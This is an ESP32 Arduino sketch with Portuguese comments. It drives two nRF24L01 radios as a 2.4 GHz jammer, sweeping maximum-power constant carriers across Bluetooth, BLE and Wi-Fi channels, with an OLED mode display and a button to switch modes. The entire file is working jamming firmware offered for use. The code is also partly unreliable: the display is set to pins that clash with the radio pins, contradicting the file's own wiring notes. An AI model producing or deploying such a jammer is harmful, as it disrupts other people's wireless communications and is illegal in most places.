/*
 * Baseado na lógica de varredura de canais RF
 * * HARDWARE SETUP:
 * * RÁDIO 1 (HSPI):
 * CE: 16 | CSN: 15 | SCK: 14 | MOSI: 13 | MISO: 12
 * * RÁDIO 2 (VSPI - Conforme sua tabela):
 * CE: 22 | CSN: 21 | SCK: 18 | MOSI: 23 | MISO: 19
 * * OLED DISPLAY (I2C - ATENÇÃO: Pinos alterados para evitar conflito):
 * SDA: 4  (Mude o fio do pino 21 para o 4)
 * SCL: 5  (Mude o fio do pino 22 para o 5)
 * * BOTÃO (Boot): GPIO 0
 * LED STATUS:   GPIO 2 (Led interno)
 */

#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>
#include <Wire.h>
#include <U8g2lib.h>

// Radio 1 (HSPI)
#define CE_PIN_1  16
#define CSN_PIN_1 15

// Radio 2 (VSPI)
#define CE_PIN_2  22
#define CSN_PIN_2 21

// Display OLED
#define OLED_SCL  5
#define OLED_SDA  4

// Botão e LED
#define BTN_PIN   0
#define LED_PIN   2

// --- Objetos ---
RF24 radio1(CE_PIN_1, CSN_PIN_1);
RF24 radio2(CE_PIN_2, CSN_PIN_2);
U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /*clock=*/22, /*data=*/21, /*reset=*/16);

// --- Variáveis de Controle ---
int currentMode = 1; // 1=BT, 2=BLE, 3=WiFi
const int MAX_MODES = 3;
bool outputEnabled = true;

// Canais WiFi (Frequências centrais convertidas para canal nRF 0-125)
// WiFi Ch 1 (2412) a 14 (2484). nRF base é 2400.
const uint8_t wifi_channels[] = {12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72, 84};

void setup() {
  Serial.begin(115200);
  pinMode(BTN_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);

  u8g2.begin();
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);
  u8g2.drawStr(10, 30, "SYSTEM BOOT...");
  u8g2.sendBuffer();

  if (!radio1.begin()) {
    Serial.println(F("Radio 1 falhou!"));
  }
  radio1.setPALevel(RF24_PA_MAX);
  radio1.setDataRate(RF24_2MBPS);
  radio1.setAutoAck(false);

  if (!radio2.begin()) {
    Serial.println(F("Radio 2 falhou!"));
  }
  radio2.setPALevel(RF24_PA_MAX);
  radio2.setDataRate(RF24_2MBPS);
  radio2.setAutoAck(false);

  Serial.println("Sistema Iniciado");
  updateDisplay();
}

// --- Funções de "Interferência" (Noise Generation) ---
void jammerBT() {
  // Bluetooth Clássico: 79 canais (2402 a 2480 MHz) -> nRF canais 2 a 80
  // Radio 1 (2-40), Radio 2 (41-80)
  // Radio 1 varredura inferior
  for (int ch = 2; ch < 40; ch++) {
    radio1.setChannel(ch);
    radio1.startConstCarrier(RF24_PA_MAX, ch);
    delayMicroseconds(100); 
    radio1.stopConstCarrier();
  }
  
  // Radio 2 varredura superior
  for (int ch = 40; ch <= 80; ch++) {
    radio2.setChannel(ch);
    radio2.startConstCarrier(RF24_PA_MAX, ch);
    delayMicroseconds(100); 
    radio2.stopConstCarrier();
  }
}

void jammerBLE() {
  // BLE: 40 Canais, espaçados de 2MHz (2402, 2404... 2480)
  // 37 (2402), 38 (2426), 39 (2480)
  // Varre o espectro focado nos passos de 2MHz
  
  for (int i = 0; i < 40; i++) {
    int ch = 2 + (i * 2); // 2, 4, 6...
    
    if (i % 2 == 0) {
      radio1.setChannel(ch);
      radio1.startConstCarrier(RF24_PA_MAX, ch);
      delayMicroseconds(50);
      radio1.stopConstCarrier();
    } else {
      radio2.setChannel(ch);
      radio2.startConstCarrier(RF24_PA_MAX, ch);
      delayMicroseconds(50);
      radio2.stopConstCarrier();
    }
  }
}

void jammerWiFi() {
  // Canais mais largos (20MHz) varrer em volta do canal central
  int num_wifi_ch = sizeof(wifi_channels);
  
  for (int i = 0; i < num_wifi_ch; i++) {
    uint8_t center_ch = wifi_channels[i];
    
    // Cobrir a banda do canal (Centro - 10MHz até Centro + 10MHz)
    // Radio 1 ataca o centro
    radio1.setChannel(center_ch);
    radio1.startConstCarrier(RF24_PA_MAX, center_ch);
    
    // Radio 2 ataca as bordas (oscila um pouco)
    radio2.setChannel(center_ch + 2); 
    radio2.startConstCarrier(RF24_PA_MAX, center_ch + 2);
    
    delayMicroseconds(200);
    
    radio1.stopConstCarrier();
    radio2.stopConstCarrier();
  }
}

// --- Interface ---
void updateDisplay() {
  u8g2.clearBuffer();
  
  // Título
  u8g2.setFont(u8g2_font_7x14B_tr);
  u8g2.drawStr(0, 12, "ESP32 JAMMER");
  u8g2.drawLine(0, 14, 128, 14);
  
  // Modo Atual
  u8g2.setFont(u8g2_font_profont12_tf);
  u8g2.setCursor(0, 35);
  u8g2.print("Mode: ");
  
  switch (currentMode) {
    case 1:
      u8g2.print("1 (Bluetooth)");
      u8g2.setCursor(0, 50);
      u8g2.print("Freq: 2402-2480MHz");
      break;
    case 2:
      u8g2.print("2 (BLE Only)");
      u8g2.setCursor(0, 50);
      u8g2.print("Freq: BLE Chs");
      break;
    case 3:
      u8g2.print("3 (Wi-Fi)");
      u8g2.setCursor(0, 50);
      u8g2.print("Freq: 2412-2484MHz");
      break;
  }
  
  // Status Bar animada (não funcionando ainda, tem que ver o que aconteceu... as vezes funciona, as vezes não)
  u8g2.drawFrame(0, 56, 128, 6);
  if (millis() % 500 < 250) {
      u8g2.drawBox(2, 58, 124, 2);
  }

  u8g2.sendBuffer();
}

void blinkStatusLED() {
  static unsigned long lastBlink = 0;
  static int blinkCount = 0;
  
  if (millis() - lastBlink > 2000) {
    for(int i=0; i<currentMode; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(100);
        digitalWrite(LED_PIN, LOW);
        delay(100);
    }
    lastBlink = millis();
  }
}

void handleButton() {
  // GPIO 0 é LOW quando pressionado
  if (digitalRead(BTN_PIN) == LOW) {
    delay(50);
    if (digitalRead(BTN_PIN) == LOW) {
      currentMode++;
      if (currentMode > MAX_MODES) currentMode = 1;
      
      Serial.print("Mudando para modo: ");
      Serial.println(currentMode);
      
      updateDisplay();
      
      while(digitalRead(BTN_PIN) == LOW); 
    }
  }
}

void loop() {
  handleButton();
  blinkStatusLED();

  // Executa o Jammer conforme o modo
  if (outputEnabled) {
    switch (currentMode) {
      case 1:
        jammerBT();
        break;
      case 2:
        jammerBLE();
        break;
      case 3:
        jammerWiFi();
        break;
    }
  }
}